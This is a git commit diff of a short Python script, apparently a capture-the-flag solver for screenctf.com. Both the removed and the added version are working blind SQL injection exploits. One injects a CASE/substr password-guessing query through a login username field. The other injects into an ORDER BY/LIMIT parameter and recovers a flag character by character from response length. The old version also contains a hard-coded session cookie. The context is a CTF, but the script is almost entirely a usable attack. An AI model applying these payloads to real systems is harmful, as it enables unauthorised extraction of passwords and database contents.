4d144a560f72f33b6908985d3a7e3c1c3e51fbee
drdisexon <32791417+drdisexon@users.noreply.github.com>
2022-11-28 08:29:21 +0530

    Update l.py

--- l.py
+++ l.py
@@ -1,26 +1,29 @@
-#!/usr/bin/env python3
 import requests
-import string
 
-url = "http://screenctf.com:20045/"
-headers = {"Cookie": "metabase.DEVICE=8defe2fc-c0e6-497d-b000-f5e4badb565c; _ga=GA1.2.508340289.1668850789"}
+alphabet = '0123456789abcdef{}'
+url = 'http://screenctf.com:20093'
 
-psw = "FLOG{"
-i = len(psw) + 1
-while True:
-    for c in string.printable:
-        data = {
-            "username": f"' or (SELECT case substr(password,1,{i}) when '{psw+c}' then 1 else 0 end from users)--",
-            "password": "a"
-        }
-        r = requests.post(url, headers=headers, data=data)
-        if 'did it' in r.text:
-            psw += c
+curr = 'FLOG{'
+i = 6
+
+done = False
+while not done:
+
+    found = False
+
+    for char in alphabet:
+        print("Trying {}".format(curr + char))
+        r = requests.post(url, data={
+            'search': '',
+            'order': f"name LIMIT (CASE (SELECT hex(substr(flag,{i},1)) FROM flag limit 1 offset 0) WHEN hex('{char}') THEN  1 ELSE 2 END)"
+        })
+        # print(r.headers['Content-length'])
+
+        if int(r.headers['Content-length']) < 3646:
+            found = True
+            curr += char
             i += 1
-            print(psw)
-            break
-        print(psw+c)
-    
-    if c == "}":
+            print("[+] Found {}".format(curr))
+
+    if not found:
         break
-print("FLAG:", psw)
